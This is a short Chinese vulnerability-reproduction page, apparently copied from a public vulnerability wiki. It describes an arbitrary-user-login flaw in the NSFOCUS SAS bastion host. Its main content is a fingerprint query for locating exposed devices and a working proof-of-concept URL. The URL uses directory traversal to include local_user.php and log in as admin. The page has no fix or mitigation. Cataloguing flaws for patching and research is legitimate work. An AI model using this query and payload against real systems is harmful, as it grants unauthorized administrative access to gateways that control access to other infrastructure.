---
title: "绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞"
date: 2026-10-18 09:16:36
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "绿盟"
tags:
  - "绿盟"
  - "漏洞复现"
---
## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

```
body="'/needUsbkey.php?username='"
```

## 漏洞复现

登陆页面

![image-20230828162656143](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162656143.png)

验证POC

```
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```

![image-20230828162712366](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162712366.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BB%BF%E7%9B%9F-SAS%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
